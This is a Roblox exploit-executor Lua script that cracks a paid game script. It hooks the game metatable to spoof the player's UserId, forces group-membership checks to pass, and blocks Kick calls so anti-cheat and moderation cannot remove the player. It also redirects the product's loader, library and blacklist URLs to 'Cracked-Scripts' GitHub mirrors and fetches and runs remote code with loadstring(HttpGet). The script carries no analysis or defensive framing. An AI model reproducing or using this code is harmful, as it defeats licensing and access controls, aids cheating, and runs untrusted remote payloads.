local spoofedUserId = 4163889872
local Players = game:GetService("Players")
local lp = Players.LocalPlayer
local whitelistedUserId = lp.UserId

local mt = getrawmetatable(game)
setreadonly(mt, false)
local oldIndex = mt.__index
mt.__index = newcclosure(function(t, k)
    if k == "IsInGroup" then
        return function() return true end
    end
    if t == lp and k == "UserId" then
        return spoofedUserId
    end
    return oldIndex(t, k)
end)
setreadonly(mt, true)

local function whitelistSelf()
    local mt2 = getrawmetatable(game)
    setreadonly(mt2, false)
    local oldIndex2 = mt2.__index
    mt2.__index = newcclosure(function(t, k)
        if t == lp and k == "UserId" then
            return whitelistedUserId
        end
        return oldIndex2(t, k)
    end)
    setreadonly(mt2, true)
end

whitelistSelf()
task.wait(1)

local function bypassTiers()
    local tiers = {
        "https://raw.githubusercontent.com/EncryptedV10/Cracked-Scripts/refs/heads/main/Los%20xd/tier2.lua",
        "https://raw.githubusercontent.com/EncryptedV10/Cracked-Scripts/refs/heads/main/Los%20xd/tier3.lua"
    }

    for _, url in ipairs(tiers) do
        local s = pcall(function()
            local data = loadstring(game:HttpGet(url))()
            if data then
                table.insert(data, spoofedUserId)
                local mt = getrawmetatable(game)
                local idx = mt.__index
                setreadonly(mt, false)
                mt.__index = newcclosure(function(t, k)
                    if k == "UserId" then
                        return spoofedUserId
                    end
                    return idx(t, k)
                end)
                setreadonly(mt, true)
            end
        end)
    end
end

bypassTiers()
task.wait(1)

local playerMT = getrawmetatable(lp)
setreadonly(playerMT, false)
local oldIndex = playerMT.__index
local oldNamecall = playerMT.__namecall

playerMT.__index = newcclosure(function(t, k)
    if k == "Kick" then
        return function() end
    end
    return oldIndex(t, k)
end)

playerMT.__namecall = newcclosure(function(self, ...)
    if getnamecallmethod() == "Kick" then
        return
    end
    return oldNamecall(self, ...)
end)

setreadonly(playerMT, true)

local function safeLoadString(url)
    if url == "https://ervcommunity.com/library.lua" then
        url = "https://raw.githubusercontent.com/EncryptedV10/Cracked-Scripts/refs/heads/main/Los%20xd/library.lua"
    elseif url == "https://raw.githubusercontent.com/hxnrych/database/refs/heads/main/misc/blacklist.lua" then
        url = "https://raw.githubusercontent.com/EncryptedV10/Cracked-Scripts/refs/heads/main/Los%20xd/Blacklist.lua"
    elseif url == "https://ervcommunity.com/loader.lua" then
        url = "https://raw.githubusercontent.com/EncryptedV10/Cracked-Scripts/refs/heads/main/Los%20xd/loader.lua"
    end
    pcall(function()
        loadstring(game:HttpGet(url))()
    end)
end

safeLoadString("https://ervcommunity.com/loader.lua")
